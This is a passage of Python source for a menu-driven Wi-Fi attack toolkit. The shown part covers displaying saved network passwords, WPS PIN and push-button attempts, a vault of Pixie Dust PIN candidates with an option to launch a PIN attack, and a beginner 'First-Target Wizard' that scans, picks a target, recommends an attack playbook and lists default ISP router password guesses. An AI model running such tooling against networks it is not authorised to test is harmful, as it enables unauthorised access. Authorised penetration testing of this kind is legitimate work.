                if nets:
                    for n in nets:
                        con.print(f"  [{n['id']}] {n['ssid']} ({n['bssid']})")
                else:
                    con.print("[dim]No saved networks[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "9":
                nets = wpa.list_networks()
                if nets:
                    for n in nets:
                        con.print(f"  [{n['id']}] {n['ssid']}")
                    nid = Prompt.ask("ID (or 'all')")
                    if nid.lower() == "all":
                        wpa.remove_network("all")
                    else:
                        wpa.remove_network(nid)
                    wpa.save_config(); con.print("[ok]Removed[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "10":
                pwds = wpa.get_saved_passwords()
                if pwds:
                    for p in pwds:
                        con.print(f"  {p['ssid']}: [ok]{p['psk']}[/]")
                else:
                    con.print("[dim]No saved passwords[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "11":
                sig = wpa.signal_poll()
                if sig:
                    for k, v in sig.items():
                        con.print(f"  {k}: [cyan]{v}[/]")
                else:
                    con.print("[dim]Not connected[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "12":
                b = Prompt.ask("BSSID (Enter=any)", default="")
                p = Prompt.ask("PIN (Enter=auto)", default="")
                ok, out = wpa.wps_pin(b if b else None, p if p else None)
                con.print(f"[ok]{out}[/]" if ok else f"[err]{out}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "13":
                b = Prompt.ask("BSSID (Enter=any)", default="")
                ok, out = wpa.wps_pbc(b if b else None)
                con.print(f"[ok]{out}[/]" if ok else f"[err]{out}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "14":
                out, _ = wpa._cli("status")
                con.print(Panel(out, title="Raw Status"))
                out2, _ = wpa._cli("list_networks")
                con.print(Panel(out2, title="Saved"))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "15":
                wpa.reconfigure(); con.print("[ok]Done[/]"); Prompt.ask("\n[dim]Enter[/]")
            elif ch == "16":
                nets = wpa.scan_results()
                if nets:
                    for n in nets:
                        self.db.add_network(n)
                    con.print(f"[ok]{len(nets)} saved[/]")
                else:
                    con.print("[warn]None[/]")
                Prompt.ask("\n[dim]Enter[/]")


    def view_candidate_pins(self):
        """Show unverified Pixie/offline PIN candidates."""
        while True:
            con.clear()
            con.print(Rule("[hdr]Candidate PIN Vault[/]", style="cyan"))
            rows = self.db.get_candidate_pins(limit=50)
            if not rows:
                con.print("[warn]No candidate PINs stored yet.[/]")
                con.print("[dim]Pixie offline hits land here until PSK is verified.[/]")
            else:
                t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                t.add_column("ID", width=4)
                t.add_column("ESSID")
                t.add_column("BSSID")
                t.add_column("PIN", style="yellow")
                t.add_column("Status")
                t.add_column("Source")
                t.add_column("When")
                for r in rows:
                    t.add_row(
                        str(r["id"]),
                        str(r["essid"] or "-")[:16],
                        str(r["bssid"] or ""),
                        str(r["pin"] or ""),
                        str(r["status"] or ""),
                        str(r["source"] or ""),
                        str(r["created_at"] or "")[:16],
                    )
                con.print(t)
            con.print("\n  [mn]1[/] Verify selected PIN via WPS  [mn]0[/] Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            if ch == "1" and rows:
                idx = IntPrompt.ask("Row # (1-N)", default=1)
                if 1 <= idx <= len(rows):
                    row = rows[idx - 1]
                    # launch pin attack preset mentally
                    con.print(
                        "Use Attack Center → PIN Attack with:\n"
                        "  BSSID {b}\n  PIN {p}".format(
                            b=row["bssid"], p=row["pin"]
                        )
                    )
                    if Confirm.ask("Start PIN verify now?", default=True):
                        self._launch_attack(
                            "4",
                            preset_target=(row["bssid"], row["essid"] or "?", 0),
                        )
                Prompt.ask("\n[dim]Enter[/]")

    def view_first_target_wizard(self):
        """Guided path for beginners: scan → assess → recommended action."""
        con.clear()
        con.print(Rule("[hdr]First-Target Wizard[/]", style="cyan"))
        con.print(
            "[dim]Authorized testing only. This wizard stays offline until you confirm "
            "an online step.[/]\n"
        )
        iface = self.cfg.get("interface", "wlan0")
        con.print("Interface: [inf]{i}[/]".format(i=iface))
        if not Confirm.ask("Run a fresh managed-mode scan now?", default=True):
            return
        # Reuse scanner view entry lightly
        try:
            from modules.scanner import scan_iw
            timeout = int(self.cfg.get("scan_timeout") or 20)
            with con.status("[ok]Scanning...[/]", spinner="dots"):
                nets = scan_iw(iface, timeout=timeout, wps_only=False)
            if not nets:
                con.print("[warn]No networks returned. Check interface/root/driver.[/]")
                Prompt.ask("\n[dim]Enter[/]")
                return
            for net in nets:
                self.db.add_network(net)
            # show top by signal
            nets = sorted(nets, key=lambda x: int(x.get("rssi") or -999), reverse=True)[:15]
            net_table(nets, "Pick a target")
            sel = IntPrompt.ask("Row #", default=1)
            if not (1 <= sel <= len(nets)):
                return
            target = nets[sel - 1]
            bssid = target["bssid"]
            hist = history_from_db(self.db, bssid)
            report = TargetAssessor(history=hist).assess(target)
            self.db.save_assessment(report)
            pb = report.get("playbook") or build_playbook(target, report)
            con.print(Panel(
                "ESSID: {e}\nBSSID: {b}\nSignal: {r} dBm\n"
                "Recommended: {rec}\nPlaybook: {pb}\nPrimary: {pr}".format(
                    e=report.get("essid"),
                    b=report.get("bssid"),
                    r=report.get("rssi"),
                    rec=report.get("recommended_method"),
                    pb=pb.get("label"),
                    pr=pb.get("primary"),
                ),
                title="Assessment",
                border_style="cyan",
            ))
            for w in (report.get("warnings") or [])[:5]:
                con.print("[warn]• {w}[/]".format(w=w))
            # ISP candidates
            if pb.get("family") in ("isp_ont", "isp_generic", "zte_cpe", "huawei_cpe"):
                cands = candidates_for_target(
                    essid=report.get("essid"), bssid=bssid,
                    model=report.get("model"), manufacturer=report.get("manufacturer"),
                )
                if cands:
                    con.print("\n[hdr]Offline password candidates[/]")
                    for line in format_candidates(cands, 8):
                        con.print("  " + line)
            con.print("\nNext actions:")
            con.print("  [mn]1[/] Open Auto Target Assessment details")
            con.print("  [mn]2[/] Handshake / PMKID menu")
            con.print("  [mn]3[/] Attack Center (manual)")
            con.print("  [mn]0[/] Done")
            ch = Prompt.ask("Select", default="0")
            if ch == "1":
                self._auto_target_assessment()
            elif ch == "2":
                self.view_handshake()
            elif ch == "3":
                self.view_attack()
        except Exception as exc:
            con.print("[err]Wizard error: {e}[/]".format(e=str(exc)))
            Prompt.ask("\n[dim]Enter[/]")

    def view_settings(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Settings[/]", style="cyan"))
            t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
            t.add_column("K", style="dim", min_width=20)
            t.add_column("V", style="cyan")
            for k, v in self.cfg.data.items():
                t.add_row(k, str(v))
            con.print(Panel(t, title="Settings", border_style="cyan"))
            con.print("\n  [mn]1[/] Interface  [mn]2[/] Scan Timeout")
            con.print("  [mn]3[/] Toggle Verbose  [mn]4[/] Backup DB")
            con.print("  [mn]5[/] Reset defaults  [mn]6[/] Rebuild PIN DB hint")
            con.print("  [mn]0[/] Back\n")
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                v = Prompt.ask("Interface", default=self.cfg.get("interface"))
                self.cfg.set("interface", v)
                con.print("[ok]Interface set to {v}[/]".format(v=v))
            elif ch == "2":
                v = IntPrompt.ask("Timeout", default=self.cfg.get("scan_timeout"))
                self.cfg.set("scan_timeout", v)
                con.print("[ok]Scan timeout: {v}s[/]".format(v=v))
            elif ch == "3":
                v = not self.cfg.get("verbose")
                self.cfg.set("verbose", v)
                con.print("[ok]Verbose: {v}[/]".format(v=v))
            elif ch == "4":
                path = self.db.backup()
                con.print("[ok]Backup: {path}[/]".format(path=path))
            elif ch == "5":
                if Confirm.ask("[err]Reset settings to defaults?[/]", default=False):
                    # Config class stores defaults on module DEFAULTS
                    from config import DEFAULTS
                    self.cfg.data = DEFAULTS.copy()
                    self.cfg.save()
                    con.print("[ok]Settings reset[/]")
            elif ch == "6":
                con.print(
                    "[inf]Rebuild offline PIN intelligence from tools/vendor/known_pins.db[/]"
                )
                if Confirm.ask("Run tools/build_pin_database.py --merge-static now?",
                               default=False):
                    import subprocess
                    script = Path(__file__).parent / "tools" / "build_pin_database.py"
                    try:
                        result = subprocess.run(
                            [sys.executable, str(script), "--merge-static"],
                            capture_output=True,
                            text=True,
                            timeout=60,
                            cwd=str(Path(__file__).parent),
                        )
                        if result.returncode == 0:
                            from modules.wps_pins import reload_pin_database
                            reload_pin_database()
                            sync = self.db.sync_wps_intelligence()
                            con.print("[ok]PIN DB rebuilt[/]")
                            con.print(result.stdout[-500:] if result.stdout else "")
                            con.print(
                                "[ok]SQLite sync: {status} v={ver} pins={pins}[/]".format(
                                    status=sync.get("status"),
                                    ver=sync.get("version"),
                                    pins=sync.get("pins"),
                                )
                            )
                        else:
                            con.print("[err]Rebuild failed[/]")
                            con.print(result.stderr or result.stdout or "")
                    except Exception as exc:
                        con.print("[err]{err}[/]".format(err=str(exc)))
                else:
                    con.print(
                        "Manual command:\n"
                        "  python3 tools/build_pin_database.py --merge-static"
                    )
            Prompt.ask("\n[dim]Enter[/]")


def main():
    def sig_handler(sig, frame):
        con.print("\n[warn]Shutdown...[/]")
        sys.exit(0)
    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)
    App().run()

if __name__ == "__main__":
    main()
